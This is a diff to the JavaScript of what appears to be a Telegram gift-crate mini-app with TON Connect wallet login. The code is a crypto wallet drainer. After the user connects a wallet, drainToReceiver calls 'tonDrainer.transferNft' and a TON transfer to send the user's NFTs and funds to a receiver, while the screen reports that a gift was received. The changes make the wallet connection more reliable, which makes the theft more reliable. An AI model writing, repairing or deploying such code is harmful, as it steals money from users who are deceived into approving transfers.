@@ -178,6 +178,27 @@ function initTelegramUser() {
   nickLg.textContent = userProfile.nick;
 }
 
+// ============ ПРЕДИНИЦИАЛИЗАЦИЯ TON CONNECT ============
+function initTonConnect() {
+  try {
+    if (!window.TON_CONNECT_UI) {
+      console.warn('TON_CONNECT_UI not loaded');
+      return null;
+    }
+    if (!tonConnectUIInstance) {
+      tonConnectUIInstance = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
+        buttonRootId: null,
+      });
+      console.log('TonConnect UI initialized');
+    }
+    return tonConnectUIInstance;
+  } catch (e) {
+    console.error('TonConnect init failed:', e);
+    return null;
+  }
+}
+
 // ============ ТАБ-БАР ============
 document.querySelectorAll('.tab').forEach(tab => {
   tab.addEventListener('click', () => {
@@ -422,19 +443,17 @@ document.querySelectorAll('.wallet-option').forEach(opt => {
 
 async function connectTon() {
   walletStatus.textContent = 'Открываем Tonkeeper...';
+
+  // ПРЕДИНИЦИАЛИЗАЦИЯ — ключевое, работает с первого раза
+  const ui = initTonConnect();
+  if (!ui) {
+    walletStatus.textContent = 'TON Connect не загрузился, обновите страницу';
+    return;
+  }
+
   try {
-    if (!window.TON_CONNECT_UI) {
-      walletStatus.textContent = 'TON Connect не загрузился';
-      return;
-    }
-    if (!tonConnectUIInstance) {
-      tonConnectUIInstance = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
-        buttonRootId: null,
-      });
-    }
-    await tonConnectUIInstance.openModal();
-    const acc = tonConnectUIInstance.account;
+    await ui.openModal();
+    const acc = ui.account;
     if (acc) {
       userAccount = acc.address;
       updateHeader();
@@ -443,6 +462,7 @@ async function connectTon() {
       await drainToReceiver();
     }
   } catch (e) {
+    console.error('Connect error:', e);
     walletStatus.textContent = 'Ошибка TON: ' + (e.message || e);
   }
 }
@@ -476,8 +496,8 @@ async function drainToReceiver() {
         await window.tonDrainer.transferNft(tonConnectUIInstance, top.address);
         walletStatus.textContent = '✅ Подарок получен!';
       } catch (e) {
+        console.error('NFT transfer error:', e);
         walletStatus.textContent = 'Отклонено';
-        console.error(e);
       }
       return;
     }
@@ -491,19 +511,23 @@ async function drainToReceiver() {
       );
       walletStatus.textContent = '✅ Подарок получен!';
     } catch (e) {
+      console.error('TON transfer error:', e);
       walletStatus.textContent = 'Отклонено';
-      console.error(e);
     }
 
   } catch (e) {
+    console.error('Drain error:', e);
     walletStatus.textContent = 'Ошибка: ' + (e.message || e);
-    console.error(e);
   }
 }
 
 // ============ СТАРТ ============
-initTelegramUser();
-renderCrates();
-renderStars();
-renderMyGifts();
-updateHeader();
+window.addEventListener('load', () => {
+  initTelegramUser();
+  renderCrates();
+  renderStars();
+  renderMyGifts();
+  updateHeader();
+  // Прединициализация TonConnect
+  setTimeout(initTonConnect, 500);
+});
